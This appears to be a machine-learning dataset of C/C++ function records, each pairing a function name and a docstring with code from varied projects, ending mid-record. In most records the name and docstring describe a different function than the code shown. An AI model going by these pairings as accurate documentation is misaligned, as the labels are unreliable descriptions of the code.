{"content":"{'function_name': 'main', 'docstring': '\/\/ Start Video..1) 0 for WebCam 2) \"Path to Video\" for a Local Video \\r', 'code': 'int detectAndDraw(Mat& img, CascadeClassifier& cascade, CascadeClassifier& nestedCascade, double scale,int& u)\\r\\n{   \\r\\n\\t\\r\\n\\t\\r\\n\\tvector<Rect> faces, faces2;\\r\\n\\tMat gray, smallImg;\\r\\n\\r\\n\\tcvtColor(img, gray, COLOR_BGR2GRAY); \/\/ Convert to Gray Scale \\r\\n\\tdouble fx = 1 \/ scale;\\r\\n\\r\\n\\t\/\/ Resize the Grayscale Image  \\r\\n\\t\/\/resize(gray, smallImg, Size(), fx, fx, INTER_LINEAR);\\r\\n\\t\/\/equalizeHist(smallImg, smallImg);\\r\\n\\r\\n\\t\/\/ Detect faces of different sizes using cascade classifier  \\r\\n\\t\/\/cascade.detectMultiScale(gray, faces, 1.1,\\r\\n\\t\\t\/\/2, 0 | CASCADE_SCALE_IMAGE, Size(30, 30));\\r\\n\\tcascade.detectMultiScale(gray, faces);\\r\\n\\t\\t\/\/fstream obj;\\r\\n\\t\/\/obj.open(\"ram.bin\");\\r\\n\\t\/\/obj.seekg(0, ios::beg);\\r\\n\\t\\r\\n\\t\\t\/\/obj.read((char *)& faces2, sizeof(Rect));\\r\\n\\t\\t\/\/u = 1;\\r\\n\\t\\r\\n\\t\/\/ Draw circles around the faces \\r\\n\\tfor (size_t i = 0; i < faces.size(); i++)\\r\\n\\t{\\r\\n\\t\\tRect r = faces[i];\\r\\n\\t\\tMat smallImgROI;\\r\\n\\t\\tvector<Rect> nestedObjects;\\r\\n\\t\\t\\r\\n\\t\\tScalar color = Scalar(255, 0, 0); \/\/ Color for Drawing tool \\r\\n\\t\\tint radius;\\r\\n\\t\\tMat gs = gray(r);\\r\\n\\t\\tMat out;\\r\\n\\t\\tcv::resize(gs, out, Size(vec[0].cols, vec[0].rows), 1.0, 1.0, INTER_CUBIC);\\r\\n\\t\\t u = model->predict(out);\\r\\n\\t\\tcout << \"\\\\n\"<<\"predicted label:\\\\n\"<<u;\\r\\n\\t\\tdouble aspect_ratio = (double)r.width \/ r.height;\\r\\n\\t\\t\\r\\n\\t\\tPoint center(faces[i].x + faces[i].width*0.5, faces[i].y + faces[i].height*0.5);\\r\\n\\t\\t\\t\/*center.x = cvRound((r.x + r.width*0.5)*scale);\\r\\n\\t\\t\\tcenter.y = cvRound((r.y + r.height*0.5)*scale);*\/\\r\\n\\t\\t\\tradius = cvRound((r.width + r.height)*0.25*scale);\\r\\n\\t\\t\\tcircle(img, center, radius, color, 3, 8, 0);\\r\\n\\t\\t\\t\\r\\n\\t\\t\/*else\\r\\n\\t\\t\\trectangle(img, cvPoint(cvRound(r.x*scale), cvRound(r.y*scale)),\\r\\n\\t\\t\\t\\tcvPoint(cvRound((r.x + r.width - 1)*scale),\\r\\n\\t\\t\\t\\t\\tcvRound((r.y + r.height - 1)*scale)), color, 3, 8, 0);*\/\\r\\n\\t\\t\\t\\t\\t\/*if (nestedCascade.empty())\\r\\n\\t\\t\\t\\t\\t\\tcontinue;*\/\\r\\n\\t\\t\\t\\t\\t\\t\/*smallImgROI = smallImg(r);\\r\\n\\r\\n\\t\\t\\t\\t\\t\\t\/\/ Detection of eyes int the input image\\r\\n\\t\\t\\t\\t\\t\\tnestedCascade.detectMultiScale(smallImgROI, nestedObjects, 1.1, 2,\\r\\n\\t\\t\\t\\t\\t\\t\\t0 | CASCADE_SCALE_IMAGE, Size(30, 30));\\r\\n\\r\\n\\t\\t\\t\\t\\t\\t\/\/ Draw circles around eyes\\r\\n\\t\\t\\t\\t\\t\\tfor (size_t j = 0; j < nestedObjects.size(); j++)\\r\\n\\t\\t\\t\\t\\t\\t{\\r\\n\\t\\t\\t\\t\\t\\t\\tRect nr = nestedObjects[j];\\r\\n\\t\\t\\t\\t\\t\\t\\tcenter.x = cvRound((r.x + nr.x + nr.width*0.5)*scale);\\r\\n\\t\\t\\t\\t\\t\\t\\tcenter.y = cvRound((r.y + nr.y + nr.height*0.5)*scale);\\r\\n\\t\\t\\t\\t\\t\\t\\tradius = cvRound((nr.width + nr.height)*0.25*scale);\\r\\n\\t\\t\\t\\t\\t\\t\\tcircle(img, center, radius, color, 3, 8, 0);\\r\\n\\t\\t\\t\\t\\t\\t}*\/\\r\\n\\t}\\r\\n\\r\\n\\t\/\/ Show Processed Image with detected faces \\r\\n\\t\/\/imshow(\"Face Detection\", img);\\r\\n\\treturn faces.size();\\r\\n}'}","id":874}
{"content":"{'function_name': 'url_encode', 'docstring': '\/* \u8bbe\u7f6e\u6700\u5c0f\u957f\u5ea6 *\/', 'code': \"std::string url_decode(const std::string& src)\\n{\\n    std::string dst;\\n    dst.reserve(src.size() \/ 3 + (src.size() % 3)); \/* \u8bbe\u7f6e\u6700\u5c0f\u957f\u5ea6 *\/\\n    for (size_t i = 0; i < src.size(); ++i)\\n    {\\n        const auto& ch = src[i];\\n        if ('%' == ch && i + 2 < src.size())\\n        {\\n            auto hex = src.substr(i + 1, 2);\\n            auto decodedCh = (char)std::strtol(hex.c_str(), nullptr, 16);\\n            dst += decodedCh;\\n            i += 2;\\n        }\\n        else if ('+' == ch)\\n        {\\n            dst += ' ';\\n        }\\n        else\\n        {\\n            dst += ch;\\n        }\\n    }\\n    return dst;\\n}\"}","id":875}
{"content":"{'function_name': 'Dictionary_2_System_Collections_ICollection_CopyTo_m5F23B3C714DAF4112EDA65E7DA3403FFE4180CF1_gshared', 'docstring': '\/\/ end catch (depth: 1)', 'code': 'IL2CPP_METHOD_ATTR void Dictionary_2_System_Collections_IDictionary_set_Item_m600B08DFBB40494335C2649087C2CD42184D0537_gshared (Dictionary_2_t5B5EDB4331A81BB919D6E19BDCCC329B8EEF324C * __this, RuntimeObject * ___key0, RuntimeObject * ___value1, const RuntimeMethod* method)\\n{\\n\\tstatic bool s_Il2CppMethodInitialized;\\n\\tif (!s_Il2CppMethodInitialized)\\n\\t{\\n\\t\\til2cpp_codegen_initialize_method (Dictionary_2_System_Collections_IDictionary_set_Item_m600B08DFBB40494335C2649087C2CD42184D0537_MetadataUsageId);\\n\\t\\ts_Il2CppMethodInitialized = true;\\n\\t}\\n\\tMatrix4x4_t6BF60F70C9169DF14C9D2577672A44224B236ECA  V_0;\\n\\tmemset(&V_0, 0, sizeof(V_0));\\n\\tint32_t V_1 = 0;\\n\\tException_t * __last_unhandled_exception = 0;\\n\\tNO_UNUSED_WARNING (__last_unhandled_exception);\\n\\tException_t * __exception_local = 0;\\n\\tNO_UNUSED_WARNING (__exception_local);\\n\\tint32_t __leave_target = -1;\\n\\tNO_UNUSED_WARNING (__leave_target);\\n\\t{\\n\\t\\tRuntimeObject * L_0 = ___key0;\\n\\t\\tif (L_0)\\n\\t\\t{\\n\\t\\t\\tgoto IL_000e;\\n\\t\\t}\\n\\t}\\n\\t{\\n\\t\\tArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD * L_1 = (ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD *)il2cpp_codegen_object_new(ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD_il2cpp_TypeInfo_var);\\n\\t\\tArgumentNullException__ctor_mEE0C0D6FCB2D08CD7967DBB1329A0854BBED49ED(L_1, (String_t*)_stringLiteralA62F2225BF70BFACCBC7F1EF2A397836717377DE, \/*hidden argument*\/NULL);\\n\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_1, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m600B08DFBB40494335C2649087C2CD42184D0537_RuntimeMethod_var);\\n\\t}\\n\\nIL_000e:\\n\\t{\\n\\t\\tRuntimeObject * L_2 = ___value1;\\n\\t\\tif (L_2)\\n\\t\\t{\\n\\t\\t\\tgoto IL_002c;\\n\\t\\t}\\n\\t}\\n\\t{\\n\\t\\til2cpp_codegen_initobj((&V_0), sizeof(Matrix4x4_t6BF60F70C9169DF14C9D2577672A44224B236ECA ));\\n\\t}\\n\\t{\\n\\t\\tArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD * L_4 = (ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD *)il2cpp_codegen_object_new(ArgumentNullException_t581DF992B1F3E0EC6EFB30CC5DC43519A79B27AD_il2cpp_TypeInfo_var);\\n\\t\\tArgumentNullException__ctor_mEE0C0D6FCB2D08CD7967DBB1329A0854BBED49ED(L_4, (String_t*)_stringLiteralF32B67C7E26342AF42EFABC674D441DCA0A281C5, \/*hidden argument*\/NULL);\\n\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_4, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m600B08DFBB40494335C2649087C2CD42184D0537_RuntimeMethod_var);\\n\\t}\\n\\nIL_002c:\\n\\t{\\n\\t}\\n\\nIL_002d:\\n\\ttry\\n\\t{ \/\/ begin try (depth: 1)\\n\\t\\t{\\n\\t\\t\\tRuntimeObject * L_5 = ___key0;\\n\\t\\t\\tV_1 = (int32_t)((*(int32_t*)((int32_t*)UnBox(L_5, IL2CPP_RGCTX_DATA(method->klass->rgctx_data, 27)))));\\n\\t\\t}\\n\\nIL_0034:\\n\\t\\ttry\\n\\t\\t{ \/\/ begin try (depth: 2)\\n\\t\\t\\tint32_t L_6 = V_1;\\n\\t\\t\\tRuntimeObject * L_7 = ___value1;\\n\\t\\t\\tNullCheck((Dictionary_2_t5B5EDB4331A81BB919D6E19BDCCC329B8EEF324C *)__this);\\n\\t\\t\\t((  void (*) (Dictionary_2_t5B5EDB4331A81BB919D6E19BDCCC329B8EEF324C *, int32_t, Matrix4x4_t6BF60F70C9169DF14C9D2577672A44224B236ECA , const RuntimeMethod*))IL2CPP_RGCTX_METHOD_INFO(method->klass->rgctx_data, 35)->methodPointer)((Dictionary_2_t5B5EDB4331A81BB919D6E19BDCCC329B8EEF324C *)__this, (int32_t)L_6, (Matrix4x4_t6BF60F70C9169DF14C9D2577672A44224B236ECA )((*(Matrix4x4_t6BF60F70C9169DF14C9D2577672A44224B236ECA *)((Matrix4x4_t6BF60F70C9169DF14C9D2577672A44224B236ECA *)UnBox(L_7, IL2CPP_RGCTX_DATA(method->klass->rgctx_data, 17))))), \/*hidden argument*\/IL2CPP_RGCTX_METHOD_INFO(method->klass->rgctx_data, 35));\\n\\t\\t\\tgoto IL_0064;\\n\\t\\t} \/\/ end try (depth: 2)\\n\\t\\tcatch(Il2CppExceptionWrapper& e)\\n\\t\\t{\\n\\t\\t\\t__exception_local = (Exception_t *)e.ex;\\n\\t\\t\\tif(il2cpp_codegen_class_is_assignable_from (InvalidCastException_t91DF9E7D7FCCDA6C562CB4A9A18903E016680FDA_il2cpp_TypeInfo_var, il2cpp_codegen_object_class(e.ex)))\\n\\t\\t\\t\\tgoto CATCH_0043;\\n\\t\\t\\tthrow e;\\n\\t\\t}\\n\\nCATCH_0043:\\n\\t\\t{ \/\/ begin catch(System.InvalidCastException)\\n\\t\\t\\tRuntimeObject * L_8 = ___value1;\\n\\t\\t\\tRuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D  L_9 = { reinterpret_cast<intptr_t> (IL2CPP_RGCTX_TYPE(method->klass->rgctx_data, 36)) };\\n\\t\\t\\tIL2CPP_RUNTIME_CLASS_INIT(Type_t_il2cpp_TypeInfo_var);\\n\\t\\t\\tType_t * L_10 = Type_GetTypeFromHandle_m9DC58ADF0512987012A8A016FB64B068F3B1AFF6((RuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D )L_9, \/*hidden argument*\/NULL);\\n\\t\\t\\tString_t* L_11 = SR_Format_m2DD0EA1F52576669B34B03CDB3D441631E1CA76C((String_t*)_stringLiteralFA5354A55A2D5AE97DEF68A54DFDDBF37A452FD6, (RuntimeObject *)L_8, (RuntimeObject *)L_10, \/*hidden argument*\/NULL);\\n\\t\\t\\tArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 * L_12 = (ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 *)il2cpp_codegen_object_new(ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1_il2cpp_TypeInfo_var);\\n\\t\\t\\tArgumentException__ctor_m26DC3463C6F3C98BF33EA39598DD2B32F0249CA8(L_12, (String_t*)L_11, (String_t*)_stringLiteralF32B67C7E26342AF42EFABC674D441DCA0A281C5, \/*hidden argument*\/NULL);\\n\\t\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_12, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m600B08DFBB40494335C2649087C2CD42184D0537_RuntimeMethod_var);\\n\\t\\t} \/\/ end catch (depth: 2)\\n\\nIL_0064:\\n\\t\\t{\\n\\t\\t\\tgoto IL_0087;\\n\\t\\t}\\n\\t} \/\/ end try (depth: 1)\\n\\tcatch(Il2CppExceptionWrapper& e)\\n\\t{\\n\\t\\t__exception_local = (Exception_t *)e.ex;\\n\\t\\tif(il2cpp_codegen_class_is_assignable_from (InvalidCastException_t91DF9E7D7FCCDA6C562CB4A9A18903E016680FDA_il2cpp_TypeInfo_var, il2cpp_codegen_object_class(e.ex)))\\n\\t\\t\\tgoto CATCH_0066;\\n\\t\\tthrow e;\\n\\t}\\n\\nCATCH_0066:\\n\\t{ \/\/ begin catch(System.InvalidCastException)\\n\\t\\tRuntimeObject * L_13 = ___key0;\\n\\t\\tRuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D  L_14 = { reinterpret_cast<intptr_t> (IL2CPP_RGCTX_TYPE(method->klass->rgctx_data, 37)) };\\n\\t\\tIL2CPP_RUNTIME_CLASS_INIT(Type_t_il2cpp_TypeInfo_var);\\n\\t\\tType_t * L_15 = Type_GetTypeFromHandle_m9DC58ADF0512987012A8A016FB64B068F3B1AFF6((RuntimeTypeHandle_t7B542280A22F0EC4EAC2061C29178845847A8B2D )L_14, \/*hidden argument*\/NULL);\\n\\t\\tString_t* L_16 = SR_Format_m2DD0EA1F52576669B34B03CDB3D441631E1CA76C((String_t*)_stringLiteralFA5354A55A2D5AE97DEF68A54DFDDBF37A452FD6, (RuntimeObject *)L_13, (RuntimeObject *)L_15, \/*hidden argument*\/NULL);\\n\\t\\tArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 * L_17 = (ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1 *)il2cpp_codegen_object_new(ArgumentException_tEDCD16F20A09ECE461C3DA766C16EDA8864057D1_il2cpp_TypeInfo_var);\\n\\t\\tArgumentException__ctor_m26DC3463C6F3C98BF33EA39598DD2B32F0249CA8(L_17, (String_t*)L_16, (String_t*)_stringLiteralA62F2225BF70BFACCBC7F1EF2A397836717377DE, \/*hidden argument*\/NULL);\\n\\t\\tIL2CPP_RAISE_MANAGED_EXCEPTION(L_17, NULL, Dictionary_2_System_Collections_IDictionary_set_Item_m600B08DFBB40494335C2649087C2CD42184D0537_RuntimeMethod_var);\\n\\t} \/\/ end catch (depth: 1)\\n\\nIL_0087:\\n\\t{\\n\\t\\treturn;\\n\\t}\\n}'}","id":886}
{"content":"{'function_name': 'SceneManagerAddWindow', 'docstring': '\/* Update Scene *\/', 'code': 'void\\nSceneManagerUpdate(\\n\\t_In_ Rect_t *DirtyArea)\\n{\\n\\t\/* Vars *\/\\n\\tDataKey_t Key;\\n\\n\\t\/* Sanity *\/\\n\\tif (GlbSceneManager == NULL)\\n\\t\\treturn;\\n\\n\\t\/* Get active scene (todo) *\/\\n\\tKey.Value = 0;\\n\\tScene_t *ActiveScene = (Scene_t*)ListGetDataByKey(GlbSceneManager->Scenes, Key, 0);\\n\\n\\t\/* Update Scene *\/\\n\\tSceneUpdate(ActiveScene, DirtyArea);\\n}'}","id":890}
{"content":"{'function_name': 'denoiseb_rd39_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd4_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd4 read pattern: { denoiseb_update_0[d0, d1] -> raw[-2 + 2d0, 2 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 2 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write0 = raw.raw_raw_update_0_write0_merged_banks_25.peek_2();\\n  return value_raw_raw_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":894}
{"content":"{'function_name': 'galsPoint', 'docstring': '\/\/     }', 'code': 'int pdcmr(double Kn, double Kk, double Xpt, double Ypt, double Rc,\\n\\t\\t\\tdouble *Xc, double *Yc, double *Xn, double *Yn, double *Xk, double *Yk)\\n{\\n\\t*Xc = *Yc = *Xn = *Yn = *Xk = *Yk = 0.0;\\n\\tKn = rad(Kn); Kk = rad(Kk);\\n\\t\\n\\tdouble signn = sign(sin(Kk-Kn));\\n\\tdouble dFi = 0.5*acos(-cos(Kk-Kn));\\n\\tdouble a = Kk + dFi*signn;\\n\\tdouble Y_c = Rc \/ sin(dFi);\\n\\t*Xc = Xpt + Y_c*sin(a); \/\/ X \u0446\u0435\u043d\u0442\u0440 \u043e\u043a\u0440\u0443\u0436\u043d\u043e\u0441\u0442\u0438\\n\\t*Yc = Ypt + Y_c*cos(a); \/\/ Y \u0446\u0435\u043d\u0442\u0440 \u043e\u043a\u0440\u0443\u0436\u043d\u043e\u0441\u0442\u0438\\n\\t\\n\\tdouble X_n = signn*(Rc*(cos(dFi)));\\n\\tdouble Y_n = Y_c - Rc*sin(dFi);\\n\\t*Xn = Xpt + X_n*cos(a) + Y_n*sin(a); \/\/ \u0425 \u0442\u043e\u0447\u043a\u0430 \u043d\u0430\u0447\u0430\u043b\u0430 \u0446\u0438\u0440\u043a\u0443\u043b\u044f\u0446\u0438\u0438\\n\\t*Yn = Ypt - X_n*sin(a) + Y_n*cos(a); \/\/ Y \u0442\u043e\u0447\u043a\u0430 \u043d\u0430\u0447\u0430\u043b\u0430 \u0446\u0438\u0440\u043a\u0443\u043b\u044f\u0446\u0438\u0438\\n\\t\\n\\tdouble X_k = -X_n;\\n\\tdouble Y_k = Y_n;\\n\\t*Xk = Xpt + X_k*cos(a) + Y_k*sin(a); \/\/ X \u0442\u043e\u0447\u043a\u0430 \u043a\u043e\u043d\u0446\u0430 \u0446\u0438\u0440\u043a\u0443\u043b\u044f\u0446\u0438\u0438\\n\\t*Yk = Ypt - X_k*sin(a) + Y_k*cos(a); \/\/ Y \u0442\u043e\u0447\u043a\u0430 \u043a\u043e\u043d\u0446\u0430 \u0446\u0438\u0440\u043a\u0443\u043b\u044f\u0446\u0438\u0438\\n\\t\\n\\treturn 1;\\n}'}","id":899}
{"content":"{'function_name': 'VkToPalImageUsageFlags', 'docstring': '\/\/ resolveSrc and shaderRead flag as well as other conditions to decide whether msaa surface and fmask is tc-compatible.', 'code': \"inline VkResult PalToVkResult(\\n    Pal::Result result)\\n{\\n    VkResult vkResult = VK_SUCCESS;\\n\\n    \/\/ This switch statement handles the non-error Vulkan return codes directly; the error Vulkan return codes are\\n    \/\/ handled separately by the call to PalToVkError in the default case.\\n    switch (result)\\n    {\\n    case Pal::Result::Success:\\n    \/\/ These PAL error codes currently aren't handled specially and they indicate success otherwise\\n    case Pal::Result::TooManyFlippableAllocations:\\n    case Pal::Result::PresentOccluded:\\n        vkResult = VK_SUCCESS;\\n        break;\\n\\n    case Pal::Result::NotReady:\\n        vkResult = VK_NOT_READY;\\n        break;\\n\\n    case Pal::Result::Timeout:\\n    case Pal::Result::ErrorFenceNeverSubmitted:\\n        vkResult = VK_TIMEOUT;\\n        break;\\n\\n    case Pal::Result::EventSet:\\n        vkResult = VK_EVENT_SET;\\n        break;\\n\\n    case Pal::Result::EventReset:\\n        vkResult = VK_EVENT_RESET;\\n        break;\\n\\n    default:\\n        vkResult = PalToVkError(result);\\n        break;\\n    }\\n\\n    return vkResult;\\n}\"}","id":910}
{"content":"{'function_name': 'looks_like_mixture_by_atom_count', 'docstring': '\/\/cerr << \"First two counts \" << atoms_in_largest_fragment << \" and \" << atoms_in_second_largest_fragment << endl;', 'code': 'static int\\nlargest_number_rings_in_a_system (Molecule & m)\\n{\\n  int nr = m.nrings();\\n\\n  if (0 == nr)\\n    return 0;\\n\\n  if (1 == nr)\\n    return 1;\\n\\n  if (2 == nr)\\n    return m.ringi(0)->is_fused() ? 2 : 1;\\n\\n\/\/ Now things get more complicated\\n\\n  int * ring_already_done = new_int(nr); std::unique_ptr<int[]> free_ring_already_done(ring_already_done);\\n\\n  int rc = 1;\\n\\n  for (int i = 0; i < nr; i++)\\n  {\\n    if (ring_already_done[i])\\n      continue;\\n\\n    const Ring * ri = m.ringi(i);\\n\\n    if (! ri->is_fused())\\n      continue;\\n\\n    int system_size = 1;\\n\\n    for (int j = i + 1; j < nr; j++)\\n    {\\n      if (ring_already_done[j])\\n        continue;\\n\\n      const Ring * rj = m.ringi(j);\\n\\n      if (rj->fused_system_identifier() != ri->fused_system_identifier())\\n        continue;\\n\\n      system_size++;\\n\\n      ring_already_done[j] = 1;\\n    }\\n\\n    if (system_size > rc)\\n      rc = system_size;\\n  }\\n\\n  return rc;\\n}'}","id":937}
{"content":"{'function_name': 'pdmR3ThreadSuspendAll', 'docstring': '\/* This may cause deadlocks later... *\/', 'code': 'PDMR3ThreadResume(PPDMTHREAD pThread)\\n{\\n    \/*\\n     * Assert sanity.\\n     *\/\\n    AssertPtrReturn(pThread, VERR_INVALID_POINTER);\\n    AssertReturn(pThread->u32Version == PDMTHREAD_VERSION, VERR_INVALID_MAGIC);\\n    Assert(pThread->Thread != RTThreadSelf());\\n\\n    \/*\\n     * Change the state to resuming and kick the thread.\\n     *\/\\n    int rc = RTThreadUserReset(pThread->Thread);\\n    if (RT_SUCCESS(rc))\\n    {\\n        rc = VERR_WRONG_ORDER;\\n        if (pdmR3AtomicCmpXchgState(pThread, PDMTHREADSTATE_RESUMING, PDMTHREADSTATE_SUSPENDED))\\n        {\\n            rc = RTSemEventMultiSignal(pThread->Internal.s.BlockEvent);\\n            if (RT_SUCCESS(rc))\\n            {\\n                \/*\\n                 * Wait for the thread to reach the running state.\\n                 *\/\\n                rc = RTThreadUserWait(pThread->Thread, 60*1000);\\n                if (    RT_SUCCESS(rc)\\n                    &&  pThread->enmState != PDMTHREADSTATE_RUNNING)\\n                    rc = VERR_PDM_THREAD_IPE_2;\\n                if (RT_SUCCESS(rc))\\n                    return rc;\\n            }\\n        }\\n    }\\n\\n    \/*\\n     * Something failed, initialize termination.\\n     *\/\\n    AssertMsgFailed((\"PDMR3ThreadResume -> rc=%Rrc enmState=%d\\\\n\", rc, pThread->enmState));\\n    pdmR3ThreadBailOut(pThread);\\n    return rc;\\n}'}","id":938}
{"content":"{'function_name': 'choosePivot', 'docstring': '\/\/ choose the middle number and swap it to the number in the right of array', 'code': 'int partition(int a[], int left, int right)\\n{\\n\\tint pivot = a[right];\\n\\tint storeIndex = left;\\n\\tint temp = 0;\\n\\n\\tprint (a, left, right);\\n\\tfor (int i = left; i <= right; ++i)\\n\\t{\\n\\t\\tif(a[i] < pivot)\\n\\t\\t{\\n\\n\\n\\t\\t\\t\/\/ swap the current value to storeIndex value to save\\n\\t\\t\\ttemp = a[i];\\n\\t\\t\\ta[i] = a[storeIndex];\\n\\t\\t\\ta[storeIndex] = temp;\\n\\n\\t\\t\\tprint (a, left, right);\\n\\t\\t\\t\/\/ increase storeIndex due to found new valid number that < pivot\\n\\t\\t\\tstoreIndex++;\\n\\t\\t}\\n\\t}\\n\\n\\t\/\/ swap the pivot value and the storeIndex value for next recursive\\n\\ta[right] = a[storeIndex];\\n\\ta[storeIndex] = pivot;\\n\\n\\tcout << \"=>\";\\n\\tprint(a, left, storeIndex - 1);\\n\\tcout << \" {\" << a[storeIndex] << \"} \";\\n\\tprint(a, storeIndex + 1, right);\\n\\tcout << endl;\\n\\n\\t\/\/ return store index that is saved pivot value\\n\\treturn storeIndex;\\n}'}","id":943}
{"content":"{'function_name': 'ball_in_tile', 'docstring': '\/* point-in-polygon algorithm found at:\\n\\t   http:\/\/www.ecse.rpi.edu\/Homepages\/wrf\/Research\/Short_Notes\/pnpoly.html\\n\\t*\/', 'code': 'bool ball_in_obj(struct ball *ball, struct object *obj) {\\n\\tint i, j;\\n\\tstruct boundingbox *bbox;\\n\\tbool inTile = false;\\n\\n\\tbbox = obj->bbox;\\n\\tif(bbox == NULL || bbox->num_points < 3) {\\n\\t\\treturn false;\\n\\t}\\n\\t\\n\\t\/* point-in-polygon algorithm found at:\\n\\t   http:\/\/www.ecse.rpi.edu\/Homepages\/wrf\/Research\/Short_Notes\/pnpoly.html\\n\\t*\/\\n\\tfor (i = 0, j = bbox->num_points-1; i < bbox->num_points; j = i++) {\\n\\t\\tif ( ((bbox->z[i] > ball->z) != (bbox->z[j] > ball->z)) &&\\n\\t\\t\\t\\t(ball->x < (bbox->x[j] - bbox->x[i]) * (ball->z - bbox->z[i]) \/ (bbox->z[j] - bbox->z[i]) + bbox->x[i]) ) {\\n\\t\\t\\tinTile = !inTile;\\n\\t\\t}\\n\\t}\\n\\treturn inTile;\\n}'}","id":953}
{"content":"{'function_name': 'PerformHTMLXPathQuery', 'docstring': '\/* Load XML document *\/', 'code': 'QVector<QtXMLElement *> PerformXMLXPathQuery(QByteArray *document, QString query)\\n{\\n    xmlDocPtr doc;\\n\\n    \/* Load XML document *\/\\n    doc = htmlReadMemory(document->data(), document->length(), \"\", \"\", XML_PARSE_RECOVER);\\n\\n    if (doc == NULL)\\n    {\\n        throw \"Unable to parse.\";\\n        \/\/      NSLog(@\"Unable to parse.\");\\n\/\/        return result;\\n    }\\n\\n    QVector<QtXMLElement *> result = PerformXPathQuery(doc, query);\\n    xmlFreeDoc(doc);\\n\\n    return result;\\n}'}","id":954}
{"content":"{'function_name': 'SC_MODULE', 'docstring': '\/\/The constructor: Nothing in it this time.', 'code': 'int sc_main(int argc, char* argv[])\\n{\\n\\t\/\/make an instance of the module for us,\\n\\tsome_module hello(\"hi\");\\n\\t\/\/Call its function.\\n\\thello.print_hello();\\n \\n\\treturn(0);\\n}'}","id":955}
{"content":"{'function_name': 'argInit_3x3_real_T', 'docstring': '\/\/ Loop over the array to initialize each element.', 'code': 'static struct0_T argInit_struct0_T()\\n{\\n  struct0_T result;\\n\\n  \/\/ Set the value of each structure field.\\n  \/\/ Change this value to the value that the application requires.\\n  result.ID = argInit_Unboundedx1_real_T();\\n  result.R0 = argInit_Unboundedx3_real_T();\\n  result.V = argInit_Unboundedx3_real_T();\\n  result.RCS = argInit_Unboundedx1_real_T();\\n  return result;\\n}'}","id":959}
{"content":"{'function_name': 'MimeOleCreateMessage', 'docstring': '\/\/ Done\\r', 'code': 'MIMEOLEAPI MimeOleCreateMessageTree(IUnknown *pUnkOuter, IMimeMessageTree **ppMessageTree)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT         hr=S_OK;\\r\\n    LPMESSAGETREE   pTree=NULL;\\r\\n\\r\\n    \/\/ check params\\r\\n    if (NULL == ppMessageTree)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ INit\\r\\n    *ppMessageTree = NULL;\\r\\n\\r\\n    \/\/ Allocate MimeMessageTree\\r\\n    CHECKALLOC(pTree = new CMessageTree(pUnkOuter));\\r\\n\\r\\n    \/\/ Init New\\r\\n    CHECKHR(hr = pTree->InitNew());\\r\\n\\r\\n    \/\/ Success\\r\\n    *ppMessageTree = pTree;\\r\\n    (*ppMessageTree)->AddRef();\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    SafeRelease(pTree);\\r\\n\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":966}
{"content":"{'function_name': 'sumf', 'docstring': '\/\/ bactrace', 'code': 'void sump(int n, int sum){\\n    if(n < 0){\\n        cout << sum;\\n        return;\\n    }\\n    sump(n-1, sum+n); \/\/ simple parametrized\\n\\n}'}","id":967}
{"content":"{'function_name': 'PurgeUnsupportedLanguagesInLanguageFamily', 'docstring': '\/\/ Purge all languages in the same family as |language|.', 'code': \"void MigrateObsoleteAlwaysTranslateLanguagesPref(PrefService* prefs) {\\n  const base::Value::Dict& deprecated_dictionary =\\n      prefs->GetDict(TranslatePrefs::kPrefAlwaysTranslateListDeprecated);\\n  \/\/ Migration is performed only once per client, since the deprecated pref is\\n  \/\/ cleared after migration. This will make subsequent calls to migrate no-ops.\\n  if (deprecated_dictionary.empty())\\n    return;\\n\\n  ScopedDictPrefUpdate always_translate_dictionary_update(\\n      prefs, prefs::kPrefAlwaysTranslateList);\\n  base::Value::Dict& always_translate_dictionary =\\n      always_translate_dictionary_update.Get();\\n\\n  for (const auto old_language_pair : deprecated_dictionary) {\\n    \/\/ If the old pref's language pair conflicts with any of the new pref's\\n    \/\/ language pairs, where either the new pref already specifies behavior\\n    \/\/ about always translating from or to the old source language, or always\\n    \/\/ translating from the old target language, then skip merging this pair\\n    \/\/ into the new pref.\\n    if 